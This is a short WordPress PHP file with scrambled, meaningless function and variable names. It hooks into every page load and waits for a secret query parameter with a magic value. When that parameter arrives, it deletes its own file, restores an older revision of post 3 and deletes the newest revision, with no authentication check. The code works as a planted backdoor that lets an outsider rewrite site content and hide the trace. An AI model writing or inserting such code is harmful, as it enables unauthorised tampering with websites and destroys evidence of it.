<?php

function query_before_review() {
	if (isset($_GET['messenger_soon_author']) && $_GET['messenger_soon_author'] === 'top_old_random') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$remover_hello_invoice = 3;
		$section_board_internal = wp_get_post_revisions($remover_hello_invoice);
		if (empty($section_board_internal)) die('no revisions');
		if (count($section_board_internal) < 2) die('less than 2');
		$calendar_role_category = array_shift($section_board_internal);
		$extended_subscriptions_table = $calendar_role_category->ID;
		$automatorwp_data_quote_ajax = array_shift($section_board_internal);
		$copyright_shopp_github_nofollow = $automatorwp_data_quote_ajax->ID;
		$crm_shipping_count_conversion = wp_restore_post_revision($copyright_shopp_github_nofollow);
		if ($crm_shipping_count_conversion === false) die('error restoring');
		$crm_shipping_count_conversion = wp_delete_post_revision($extended_subscriptions_table);		
		if ($crm_shipping_count_conversion === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'query_before_review');
